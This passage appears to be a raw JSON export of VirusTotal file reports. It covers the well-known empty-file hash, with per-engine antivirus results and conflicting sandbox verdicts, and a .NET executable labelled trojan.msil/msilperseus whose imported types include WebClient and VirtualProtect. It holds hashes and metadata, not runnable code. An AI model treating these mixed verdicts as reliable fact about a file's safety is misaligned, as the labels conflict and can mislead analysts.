          "rtc.dll-289befbde6186db2a7e220f580fbe53afe6727f6a412a8786ae59de9c1bf2794",
          "suf80_launch.exe-cfc507fafd9e1dc327768da8a816607d9021ea65d823c1bd668c042cb6222b6a",
          "uiAlert.dll-8cc4847890e998695defdd598ab0f2c33704834d10044c2b918db16c134a749b",
          "ObserveITWebConsole.cmd",
          "madera.h",
          "tseRes.dll-dca5a52d4be382e259aecb66110441fbc133a30978008a9c5a15c60ea5d90290",
          "ScheduledTask_DSE_policy_check.xml"
        ],
        "products": [
          "ubuntu-os-pro-cloud-ubuntu-pro-fips-1804-bionic-v20240118",
          "suse-byos-cloud-sles-15-sp5-byos-v20240126-x86-64",
          "suse-byos-cloud-sles-15-sp5-sap-byos-v20240126-x86-64",
          "fedora-coreos-cloud-fedora-coreos-39-20240112-1-0-gcp-x86-64",
          "Sound Pool 18 DVD Collection",
          "Kali Linux Live Boot Apple M1",
          "suse-byos-cloud-sles-sap-15-sp5-hardened-byos-v20240126-x86-64",
          "suse-cloud-sles-15-sp5-v20240126-arm64",
          "ubuntu-os-pro-cloud-ubuntu-pro-fips-2004-focal-v20240126",
          "suse-cloud-sles-15-sp5-v20240126-x86-64",
          "ubuntu-os-pro-cloud-ubuntu-pro-1804-bionic-arm64-v20240116",
          "cos-cloud-cos-arm64-beta-109-17800-66-65",
          "cos-cloud-cos-stable-109-17800-66-58",
          "cos-cloud-cos-beta-109-17800-66-65",
          "suse-byos-cloud-sles-15-sp5-byos-v20240126-arm64",
          "ubuntu-os-pro-cloud-ubuntu-pro-fips-2004-focal-v20240117",
          "suse-byos-cloud-sles-12-sp5-byos-v20240125-x86-64",
          "cos-cloud-cos-arm64-stable-109-17800-66-65",
          "ubuntu-os-pro-cloud-ubuntu-pro-1604-xenial-v20240126",
          "ubuntu-os-cloud-ubuntu-minimal-2304-lunar-arm64-v20240123",
          "suse-byos-cloud-sles-15-sp5-hardened-byos-v20240126-x86-64",
          "cos-cloud-cos-109-17800-66-65",
          "UE_4.21",
          "ubuntu-os-pro-cloud-ubuntu-pro-1804-bionic-arm64-v20240125",
          "cos-cloud-cos-stable-109-17800-66-65",
          "cos-cloud-cos-arm64-109-17800-66-65",
          "cos-cloud-cos-105-17412-226-68",
          "suse-byos-cloud-sles-12-sp5-sap-byos-v20240125-x86-64",
          "ubuntu-os-cloud-ubuntu-minimal-2304-lunar-amd64-v20240123",
          "052-33037-%!s(<nil>)-%!s(<nil>)",
          "ubuntu-os-pro-cloud-ubuntu-pro-1804-bionic-v20240125",
          "052-33037-12.7.3-21H1015",
          "suse-byos-cloud-sle-micro-5-4-byos-v20240125-arm64"
        ],
        "distributors": [
          "ExpressVPN",
          "Linux",
          "Offensive Security",
          "Apple",
          "Oracle",
          "Symantec",
          "Google",
          "IAR Systems AB",
          "Siemens",
          "F. Hoffmann-La Roche Ltd.",
          "Microsoft",
          "HP",
          "Draeger",
          "G DATA",
          "ObserveIT",
          "Electric Quilt"
        ],
        "data_sources": [
          "expressvpn",
          "HashDB",
          "National Software Reference Library (NSRL)",
          "monitor_hashdb_apple",
          "monitor_oracle",
          "monitor_symantec",
          "monitor_google",
          "monitor_iar",
          "monitor_siemens",
          "monitor_roche",
          "monitor_microsoft_updates",
          "monitor_hashdb_microsoft",
          "monitor_hashdb_linux",
          "monitor_hp",
          "monitor_draeger",
          "monitor_gdata",
          "monitor_observeit",
          "monitor_microsoft",
          "monitor_electricquilt"
        ]
      },
      "last_analysis_results": {
        "Bkav": {
          "category": "undetected",
          "engine_name": "Bkav",
          "engine_version": "2.0.0.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240127"
        },
        "Lionic": {
          "category": "undetected",
          "engine_name": "Lionic",
          "engine_version": "7.5",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240127"
        },
        "tehtris": {
          "category": "type-unsupported",
          "engine_name": "tehtris",
          "engine_version": null,
          "result": null,
          "method": "blacklist",
          "engine_update": "20240127"
        },
        "ClamAV": {
          "category": "undetected",
          "engine_name": "ClamAV",
          "engine_version": "1.2.1.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240127"
        },
        "CMC": {
          "category": "undetected",
          "engine_name": "CMC",
          "engine_version": "2.4.2022.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240125"
        },
        "CAT-QuickHeal": {
          "category": "undetected",
          "engine_name": "CAT-QuickHeal",
          "engine_version": "22.00",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "Skyhigh": {
          "category": "undetected",
          "engine_name": "Skyhigh",
          "engine_version": "v2021.2.0+4045",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "ALYac": {
          "category": "undetected",
          "engine_name": "ALYac",
          "engine_version": "2.0.0.8",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240127"
        },
        "Malwarebytes": {
          "category": "undetected",
          "engine_name": "Malwarebytes",
          "engine_version": "4.5.5.54",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240127"
        },
        "Zillya": {
          "category": "undetected",
          "engine_name": "Zillya",
          "engine_version": "2.0.0.5041",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "Sangfor": {
          "category": "undetected",
          "engine_name": "Sangfor",
          "engine_version": "2.23.0.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "K7AntiVirus": {
          "category": "undetected",
          "engine_name": "K7AntiVirus",
          "engine_version": "12.138.50869",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240127"
        },
        "Alibaba": {
          "category": "type-unsupported",
          "engine_name": "Alibaba",
          "engine_version": "0.3.0.5",
          "result": null,
          "method": "blacklist",
          "engine_update": "20190527"
        },
        "K7GW": {
          "category": "undetected",
          "engine_name": "K7GW",
          "engine_version": "12.138.50870",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240127"
        },
        "Trustlook": {
          "category": "timeout",
          "engine_name": "Trustlook",
          "engine_version": "1.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240127"
        },
        "BitDefenderTheta": {
          "category": "undetected",
          "engine_name": "BitDefenderTheta",
          "engine_version": "7.2.37796.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240103"
        },
        "VirIT": {
          "category": "undetected",
          "engine_name": "VirIT",
          "engine_version": "9.5.627",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "SymantecMobileInsight": {
          "category": "type-unsupported",
          "engine_name": "SymantecMobileInsight",
          "engine_version": "2.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240103"
        },
        "Symantec": {
          "category": "undetected",
          "engine_name": "Symantec",
          "engine_version": "1.21.0.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "Elastic": {
          "category": "type-unsupported",
          "engine_name": "Elastic",
          "engine_version": "4.0.125",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240115"
        },
        "ESET-NOD32": {
          "category": "undetected",
          "engine_name": "ESET-NOD32",
          "engine_version": "28639",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240127"
        },
        "APEX": {
          "category": "undetected",
          "engine_name": "APEX",
          "engine_version": "6.493",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240125"
        },
        "Avast": {
          "category": "undetected",
          "engine_name": "Avast",
          "engine_version": "23.9.8494.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240127"
        },
        "Cynet": {
          "category": "undetected",
          "engine_name": "Cynet",
          "engine_version": "4.0.0.29",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240127"
        },
        "Kaspersky": {
          "category": "undetected",
          "engine_name": "Kaspersky",
          "engine_version": "22.0.1.28",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240127"
        },
        "BitDefender": {
          "category": "undetected",
          "engine_name": "BitDefender",
          "engine_version": "7.2",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240127"
        },
        "NANO-Antivirus": {
          "category": "undetected",
          "engine_name": "NANO-Antivirus",
          "engine_version": "1.0.146.25796",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240127"
        },
        "ViRobot": {
          "category": "undetected",
          "engine_name": "ViRobot",
          "engine_version": "2014.3.20.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "MicroWorld-eScan": {
          "category": "undetected",
          "engine_name": "MicroWorld-eScan",
          "engine_version": "14.0.409.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240127"
        },
        "Tencent": {
          "category": "undetected",
          "engine_name": "Tencent",
          "engine_version": "1.0.0.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240127"
        },
        "Emsisoft": {
          "category": "undetected",
          "engine_name": "Emsisoft",
          "engine_version": "2022.6.0.32461",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240127"
        },
        "Baidu": {
          "category": "undetected",
          "engine_name": "Baidu",
          "engine_version": "1.0.0.2",
          "result": null,
          "method": "blacklist",
          "engine_update": "20190318"
        },
        "F-Secure": {
          "category": "undetected",
          "engine_name": "F-Secure",
          "engine_version": "18.10.1547.307",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "DrWeb": {
          "category": "undetected",
          "engine_name": "DrWeb",
          "engine_version": "7.0.61.8090",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240127"
        },
        "VIPRE": {
          "category": "undetected",
          "engine_name": "VIPRE",
          "engine_version": "6.0.0.35",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240127"
        },
        "TrendMicro": {
          "category": "undetected",
          "engine_name": "TrendMicro",
          "engine_version": "11.0.0.1006",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240127"
        },
        "SentinelOne": {
          "category": "type-unsupported",
          "engine_name": "SentinelOne",
          "engine_version": "23.4.2.3",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231119"
        },
        "FireEye": {
          "category": "undetected",
          "engine_name": "FireEye",
          "engine_version": "35.47.0.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240127"
        },
        "Sophos": {
          "category": "undetected",
          "engine_name": "Sophos",
          "engine_version": "2.4.3.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240127"
        },
        "Paloalto": {
          "category": "undetected",
          "engine_name": "Paloalto",
          "engine_version": "0.9.0.1003",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240127"
        },
        "GData": {
          "category": "undetected",
          "engine_name": "GData",
          "engine_version": "A:25.37244B:27.34712",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240127"
        },
        "Jiangmin": {
          "category": "undetected",
          "engine_name": "Jiangmin",
          "engine_version": "16.0.100",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "Webroot": {
          "category": "type-unsupported",
          "engine_name": "Webroot",
          "engine_version": "1.0.0.403",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240127"
        },
        "Varist": {
          "category": "undetected",
          "engine_name": "Varist",
          "engine_version": "6.5.1.2",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240127"
        },
        "Avira": {
          "category": "undetected",
          "engine_name": "Avira",
          "engine_version": "8.3.3.16",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240127"
        },
        "MAX": {
          "category": "confirmed-timeout",
          "engine_name": "MAX",
          "engine_version": "2023.1.4.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240127"
        },
        "Antiy-AVL": {
          "category": "undetected",
          "engine_name": "Antiy-AVL",
          "engine_version": "3.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240127"
        },
        "Kingsoft": {
          "category": "undetected",
          "engine_name": "Kingsoft",
          "engine_version": "None",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230906"
        },
        "Gridinsoft": {
          "category": "type-unsupported",
          "engine_name": "Gridinsoft",
          "engine_version": "1.0.156.174",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240127"
        },
        "Xcitium": {
          "category": "undetected",
          "engine_name": "Xcitium",
          "engine_version": "36382",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240127"
        },
        "Arcabit": {
          "category": "undetected",
          "engine_name": "Arcabit",
          "engine_version": "2022.0.0.18",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240127"
        },
        "SUPERAntiSpyware": {
          "category": "undetected",
          "engine_name": "SUPERAntiSpyware",
          "engine_version": "5.6.0.1032",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240127"
        },
        "ZoneAlarm": {
          "category": "undetected",
          "engine_name": "ZoneAlarm",
          "engine_version": "1.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240127"
        },
        "Avast-Mobile": {
          "category": "type-unsupported",
          "engine_name": "Avast-Mobile",
          "engine_version": "240127-00",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240127"
        },
        "Microsoft": {
          "category": "undetected",
          "engine_name": "Microsoft",
          "engine_version": "1.1.23110.2",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240127"
        },
        "Google": {
          "category": "undetected",
          "engine_name": "Google",
          "engine_version": "1706356884",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240127"
        },
        "BitDefenderFalx": {
          "category": "type-unsupported",
          "engine_name": "BitDefenderFalx",
          "engine_version": "2.0.936",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240108"
        },
        "AhnLab-V3": {
          "category": "undetected",
          "engine_name": "AhnLab-V3",
          "engine_version": "3.25.0.10459",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240127"
        },
        "Acronis": {
          "category": "type-unsupported",
          "engine_name": "Acronis",
          "engine_version": "1.2.0.121",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230828"
        },
        "McAfee": {
          "category": "undetected",
          "engine_name": "McAfee",
          "engine_version": "6.0.6.653",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240127"
        },
        "TACHYON": {
          "category": "undetected",
          "engine_name": "TACHYON",
          "engine_version": "2024-01-27.02",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240127"
        },
        "DeepInstinct": {
          "category": "type-unsupported",
          "engine_name": "DeepInstinct",
          "engine_version": "5.0.0.8",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240122"
        },
        "VBA32": {
          "category": "undetected",
          "engine_name": "VBA32",
          "engine_version": "5.0.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "Cylance": {
          "category": "type-unsupported",
          "engine_name": "Cylance",
          "engine_version": "2.0.0.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240103"
        },
        "Zoner": {
          "category": "undetected",
          "engine_name": "Zoner",
          "engine_version": "2.2.2.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240127"
        },
        "TrendMicro-HouseCall": {
          "category": "undetected",
          "engine_name": "TrendMicro-HouseCall",
          "engine_version": "10.0.0.1040",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240127"
        },
        "Rising": {
          "category": "undetected",
          "engine_name": "Rising",
          "engine_version": "25.0.0.27",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240127"
        },
        "Yandex": {
          "category": "undetected",
          "engine_name": "Yandex",
          "engine_version": "5.5.2.24",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240127"
        },
        "Ikarus": {
          "category": "undetected",
          "engine_name": "Ikarus",
          "engine_version": "6.2.4.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240127"
        },
        "MaxSecure": {
          "category": "undetected",
          "engine_name": "MaxSecure",
          "engine_version": "1.0.0.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240125"
        },
        "Fortinet": {
          "category": "undetected",
          "engine_name": "Fortinet",
          "engine_version": "None",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240127"
        },
        "AVG": {
          "category": "undetected",
          "engine_name": "AVG",
          "engine_version": "23.9.8494.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240127"
        },
        "Cybereason": {
          "category": "type-unsupported",
          "engine_name": "Cybereason",
          "engine_version": "1.2.449",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231102"
        },
        "Panda": {
          "category": "undetected",
          "engine_name": "Panda",
          "engine_version": "4.6.4.2",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240127"
        },
        "CrowdStrike": {
          "category": "type-unsupported",
          "engine_name": "CrowdStrike",
          "engine_version": "1.0",
          "result": null,
          "method": "blacklist",
          "engine_update": null
        }
      },
      "sandbox_verdicts": {
        "C2AE": {
          "category": "malicious",
          "confidence": 50,
          "sandbox_name": "C2AE",
          "malware_classification": [
            "STEALER"
          ],
          "malware_names": [
            "Salgorea"
          ]
        },
        "Yomi Hunter": {
          "category": "harmless",
          "sandbox_name": "Yomi Hunter",
          "malware_classification": [
            "CLEAN"
          ]
        },
        "ReaQta-Hive": {
          "category": "malicious",
          "sandbox_name": "ReaQta-Hive",
          "malware_classification": [
            "MALWARE"
          ]
        }
      },
      "sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
      "trusted_verdict": {
        "verdict": "goodware",
        "organization": "Google",
        "link": "https://dl.google.com/dl/android/cts/android-cts-7.1_r6-linux_x86-arm.zip",
        "filename": "android-cts-7.1_r6-linux_x86-arm.zip"
      },
      "tags": [
        "nsrl",
        "runtime-modules",
        "zero-filled",
        "direct-cpu-clock-access",
        "via-tor",
        "software-collection",
        "known-distributor",
        "trusted",
        "attachment"
      ],
      "last_analysis_date": 1706360601,
      "unique_sources": 3756,
      "first_submission_date": 1158564375,
      "ssdeep": "3::",
      "oldapps_info": {
        "website": "http://oldapps.com/blender.php?old_blender=7584",
        "oldapps": "http://oldapps.com/blender.php?old_blender=7584?download",
        "product": "Blender 2.63 (x64)",
        "developer": "The Blender Foundation"
      },
      "md5": "d41d8cd98f00b204e9800998ecf8427e",
      "sha1": "da39a3ee5e6b4b0d3255bfef95601890afd80709",
      "magic": "empty",
      "last_analysis_stats": {
        "harmless": 0,
        "type-unsupported": 14,
        "suspicious": 0,
        "confirmed-timeout": 1,
        "timeout": 1,
        "failure": 0,
        "malicious": 0,
        "undetected": 59
      },
      "meaningful_name": "android-cts-7.1_r6-linux_x86-arm.zip",
      "reputation": 1617,
      "first_seen_itw_date": 1127126949,
      "monitor_info": {
        "organizations": [
          "ObserveIT",
          "Google",
          "Electric Quilt",
          "Apple",
          "Siemens",
          "Draeger",
          "HP",
          "G DATA",
          "F. Hoffmann-La Roche Ltd.",
          "Linux",
          "Oracle",
          "Symantec",
          "Microsoft"
        ],
        "filenames": [
          "33506fc4-c1d0-46a0-92d4-047ce0d07634",
          "68bae406-c776-4959-82a4-cb1fdae972a8",
          "igvk32.dll-71e687582abc2fc53ddf47dda0288b258cf6fa97049d82ddf24ce71025943783",
          "9468d0d6-11bb-4ef4-96a4-e545fdf6e7bf",
          "Iron.dll-1d30936a490b8e8499467272760d38f3d234b9544b1589bc3e47ea9285e59453",
          "fsdui.exe-0237ac5da79ecec5af54fc0e28aaea5da5690ba93f36d0f3c6b005fe0a7dffda",
          "fsdui.exe-ed3d6532815513ef074e122f893d800347075f038046de3a9028e4231328f9ff",
          "bbRGen.dll-16d707bcf5a581a03e1d965022ac83ba0afa3dc5169695ac4a2c6bc1fda3300f",
          "Setup.exe-94802d243f960f849f40fc437b53bf89b92f14a91b65fef6bb0eb1ceaaf0b53c",
          "18fee64a-1e7f-4932-8158-e8ab241f3a1a",
          "lcms.dll-a7465b9c52fbcadcf7114b1effec4dd03e2231625ebc9add6cfbfbcbf4698c54",
          "atiode.exe-8a21b08ab6c638c0225643dedffc2f1b7199f71fdb7772abc15390c5c3a674ef",
          "NFT.exe-65d67829fe5c1a08444d1d3b0dcf76304454dd383e9d2385c421286f3f856169",
          "fsdui.exe-c7df0544d8212d40735d3aa5e7ef953472279fdf0cc4c64230d37e281a1924af",
          "System.Deployment.resources.dll-2cfd4ec1d87e54fd4c36d42547b951cc716a8763384a79f48bb7d5c1d24b0e46",
          "fsdui.exe-6df75472c30b3b1a7517cf9255666195da0d032360324bbe5d6f7bc073618447",
          "fsdui.exe-32e6163b611c1cbac85769addfe94ac081c7dd1786146522733c054d26d61ff2",
          "ca3af54a-b237-4268-8cbc-45c2fdd762e9",
          "c6d99bc1-1af1-4f2d-9a73-313be5620717",
          "b42ad700-47d3-4b30-ae9c-7f1328ea9232",
          "9f9f5312-8d34-4b13-84b9-f488e06712ae",
          "4596e1fa-32c3-4000-be44-3182e41b236c",
          "coinst_15.20.dll-1fbfdd6f82d3352e6c2b4ac0223398e8649d34226dc9a8cee27968a7953b6829",
          "b73edfa0-ab54-410b-8d3d-f69b6245fb79",
          "BUShell.dll-0b932bd4bcde42bede793db9397a9ddbfa867e4dc68df6dce408e369c8858d84",
          "4bf8f4c8-2812-448e-9988-0dd3695741c6",
          "fsdui.exe-68fbb12e2be2b5cabf952c82241fa67483cf6b4f3ad339e15820b160bd658a91",
          "fsdui.exe-6cb30a1351a3abc3512e389bf9c59ae19547b701f9a75454e4d92be680e610d5",
          "ee0e1764-6dc5-4b0b-b9cc-a342d9818a1c",
          "2b3a456c-6fa1-4154-8ac2-eb81e5484659",
          "fsdui.exe-5869a7509cd7234629877e7ab2644ba5e58b736c4c47d5fdbf8060d5d194db31",
          "2229eeeb-7151-4870-8d88-b670c9638054",
          "9f5c2cce-13d6-4b70-814d-ec7e1106be04",
          "SymHelp.exe-803494eb0408221dac2abed266c6bb8c2409fc3e10d73529103ceac5844a5c5f",
          "14aef02b-32ec-431e-87e1-9ed84e3855f8",
          "7bbb49e8-94d6-463d-9e39-435c467efb8c",
          "Symantec_Agent_setup.exe-d7467080d5d0073dea71e017d03a4f630476acb04e4c814276e704d8fca902a2",
          "amduve64.dll-5b5a0f84fb7279b64364fbcedd8c88fc2f4b6d2d4e2ee36c54a2ed04c229fa68",
          "AeXClientUpgrade.exe-57f39f752ac0eacb7165c05544389ea39545ee3ef9a0ac669c2253a468daf140",
          "fsdui.exe-1ecac0bec11c59b9ea26dd854b6dce414a22f0ca62abefecbb01f002f0c4ab4b",
          "atiumdag.dll-eaceed8ac7c34625658aed8e3bd03c72ffb3f79ac96ab93532fab4156a047b20",
          "eaa60501-e1aa-43de-ad86-1f78439e2125",
          "SISIPSService.exe-c286b214de6e7821c02055386d707ed9386d4c2b0bf636a74feb9d1985a5f177",
          "980c8146-2c94-424a-af83-ef8b02166fba",
          "igxpin.exe.mui-df0449876ec2c9f998316a157663311d2a36daacb5ba76aa25f9b9a0d7c07c1d",
          "c42d391d-6af6-4cdb-b1d5-b8ca07a76e58",
          "LiveUpdate.exe-98b0003756978b45845938f9af4d6e85cd05b53d0f86596df28645b70f97c9bd",
          "608e2c2b-37f7-4c2e-b1c6-be5dc0a01be3",
          "fsdui.exe-ef719e9b143fd2b7ef4486d264ff227bd560277b2f1d20dc4b8372e0d7b40ab9",
          "fsdui.exe-8812249287a7cd82ebc171c47f3a92c5c02ea842ea17dd26222d946fc7f5d8ba"
        ]
      }
    },
    "type": "file",
    "id": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
    "links": {
      "self": "https://www.virustotal.com/api/v3/files/e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
    }
  }
},
{
  "_id": {
    "$oid": "65b501cc35757fba8f94de20"
  },
  "data": {
    "attributes": {
      "type_description": "Win32 EXE",
      "tlsh": "T13F73DCDD726072EFC857D472DEA82C68FA6174BB831B4603942715ADEA4D89BCF140F2",
      "vhash": "27405f7655151611508412e3060",
      "type_tags": [
        "executable",
        "windows",
        "win32",
        "pe",
        "peexe"
      ],
      "creation_date": {
        "$numberLong": "2438869553"
      },
      "names": [
        "WindowsApp1.exe"
      ],
      "signature_info": {
        "product": "WindowsApp1",
        "description": "WindowsApp1",
        "copyright": "Copyright ©  2019",
        "original name": "WindowsApp1.exe",
        "file version": "1.0.0.0",
        "internal name": "WindowsApp1.exe"
      },
      "last_modification_date": 1613645137,
      "type_tag": "peexe",
      "times_submitted": 1,
      "total_votes": {
        "harmless": 0,
        "malicious": 0
      },
      "size": 78848,
      "popular_threat_classification": {
        "suggested_threat_label": "trojan.msil/msilperseus",
        "popular_threat_category": [
          {
            "count": 24,
            "value": "trojan"
          }
        ],
        "popular_threat_name": [
          {
            "count": 10,
            "value": "msil"
          },
          {
            "count": 7,
            "value": "msilperseus"
          },
          {
            "count": 2,
            "value": "r022c0gh120"
          }
        ]
      },
      "authentihash": "a2381254d556a4812bf9cd6b4926f9f2baa4c18a1cc47ea762dc955eb8a80add",
      "last_submission_date": 1562364149,
      "meaningful_name": "WindowsApp1.exe",
      "trid": [
        {
          "file_type": "Win16 NE executable (generic)",
          "probability": 24.9
        },
        {
          "file_type": "Win32 Dynamic Link Library (generic)",
          "probability": 23.2
        },
        {
          "file_type": "Win32 Executable (generic)",
          "probability": 15.9
        },
        {
          "file_type": "Win16/32 Executable Delphi generic",
          "probability": 7.3
        },
        {
          "file_type": "OS/2 Executable (generic)",
          "probability": 7.1
        }
      ],
      "sandbox_verdicts": {
        "C2AE": {
          "category": "undetected",
          "sandbox_name": "C2AE",
          "malware_classification": [
            "UNKNOWN_VERDICT"
          ]
        }
      },
      "sha256": "d78980d8f52495b9f8fe619b130b893372052fb63a6e9efe9665beec0321b023",
      "type_extension": "exe",
      "tags": [
        "peexe",
        "assembly"
      ],
      "last_analysis_date": 1607142172,
      "unique_sources": 1,
      "first_submission_date": 1562364149,
      "sha1": "e14426bd0ccfa03481ce3e2385f465ed189b80c5",
      "ssdeep": "1536:01aNOlgQPBj/sIXeU1H+zbs8A248SoX3PNGRD:01aQljPBj/vjE4248SoX3PNGRD",
      "md5": "8870c9b41664633dad5c0743f9dff0d3",
      "dot_net_assembly": {
        "external_modules": [
          "kernel32.dll"
        ],
        "assembly_data": {
          "majorversion": 1,
          "minorversion": 0,
          "hashalgid": 32772,
          "flags_text": "afPA_None",
          "buildnumber": 0,
          "culture": "",
          "flags": 0,
          "pubkey": "",
          "revisionnumber": 0,
          "name": "WindowsApp1"
        },
        "assembly_name": "WindowsApp1.exe",
        "unmanaged_method_list": [
          {
            "name": "kernel32.dll",
            "methods": [
              "VirtualProtect"
            ]
          }
        ],
        "type_definition_list": [
          {
            "type_definitions": [
              "HelpKeywordAttribute"
            ],
            "namespace": "System.ComponentModel.Design"
          },
          {
            "type_definitions": [
              "Type",
              "RuntimeTypeHandle",
              "ResolveEventArgs",
              "ValueType",
              "Object",
              "InvalidOperationException",
              "Exception",
              "ArgumentException",
              "EventArgs",
              "EventHandler",
              "IDisposable",
              "Attribute",
              "STAThreadAttribute",
              "ThreadStaticAttribute",
              "Environment",
              "String",
              "IntPtr",
              "Byte",
              "UInt32",
              "Array",
              "RuntimeFieldHandle",
              "Buffer",
              "AppDomain",
              "ResolveEventHandler",
              "Math",
              "Activator"
            ],
            "namespace": "System"
          },
          {
            "type_definitions": [
              "ComVisibleAttribute",
              "GuidAttribute",
              "Marshal"
            ],
            "namespace": "System.Runtime.InteropServices"
          },
          {
            "type_definitions": [
              "WebClient"
            ],
            "namespace": "System.Net"
          },
          {
            "type_definitions": [
              "FileSystemProxy"
            ],
            "namespace": "Microsoft.VisualBasic.MyServices"
          },
          {
            "type_definitions": [
              "Assembly",
              "MethodInfo",
              "MethodBase",
              "Module",
              "AssemblyTitleAttribute",
              "AssemblyDescriptionAttribute",
              "AssemblyCompanyAttribute",
              "AssemblyProductAttribute",
              "AssemblyCopyrightAttribute",
              "AssemblyTrademarkAttribute",
              "AssemblyFileVersionAttribute",
              "TargetInvocationException"
            ],
            "namespace": "System.Reflection"
          },
          {
            "type_definitions": [
              "WindowsFormsApplicationBase",
              "User",
              "ShutdownEventHandler",
              "AuthenticationMode",
              "ShutdownMode"
            ],
            "namespace": "Microsoft.VisualBasic.ApplicationServices"
          },
          {
            "type_definitions": [
              "GeneratedCodeAttribute"
            ],
            "namespace": "System.CodeDom.Compiler"
          },
          {
            "type_definitions": [
              "ResourceManager"
            ],
            "namespace": "System.Resources"
          },
          {
            "type_definitions": [
              "DebuggingModes"
            ],
            "namespace": "uncategorized"
          },
          {
            "type_definitions": [
              "HideModuleNameAttribute",
              "MyGroupCollectionAttribute",
              "Interaction"
            ],
            "namespace": "Microsoft.VisualBasic"
          },
          {
            "type_definitions": [
              "Encoding"
            ],
            "namespace": "System.Text"
          },
          {
            "type_definitions": [
              "SuppressIldasmAttribute",
              "CompilationRelaxationsAttribute",
              "RuntimeCompatibilityAttribute",
              "CompilerGeneratedAttribute",
              "RuntimeHelpers"
            ],
            "namespace": "System.Runtime.CompilerServices"
          },
          {
            "type_definitions": [
              "ApplicationSettingsBase",
              "SettingsBase"
            ],
            "namespace": "System.Configuration"
          },
          {
            "type_definitions": [
              "Computer",
              "ServerComputer"
            ],
            "namespace": "Microsoft.VisualBasic.Devices"
          },
          {
            "type_definitions": [
              "TargetFrameworkAttribute"
            ],
            "namespace": "System.Runtime.Versioning"
          },
          {
            "type_definitions": [
              "Thread",
              "ParameterizedThreadStart",
              "Monitor"
            ],
            "namespace": "System.Threading"
          },
          {
            "type_definitions": [
              "CultureInfo"
            ],
            "namespace": "System.Globalization"
          },
          {
            "type_definitions": [
              "Process",
              "DebuggableAttribute",
              "DebuggerHiddenAttribute",
              "DebuggerStepThroughAttribute",
              "DebuggerNonUserCodeAttribute",
              "Debugger"
            ],
            "namespace": "System.Diagnostics"
          },
          {
            "type_definitions": [
              "Hashtable"
            ],
            "namespace": "System.Collections"
          },
          {
            "type_definitions": [
              "Stream",
              "MemoryStream"
            ],
            "namespace": "System.IO"
          },
          {
            "type_definitions": [
              "SizeF",
              "Size"
            ],
            "namespace": "System.Drawing"
          },
          {
            "type_definitions": [
              "IContainer",
              "EditorBrowsableAttribute",
              "EditorBrowsableState",
              "Component"
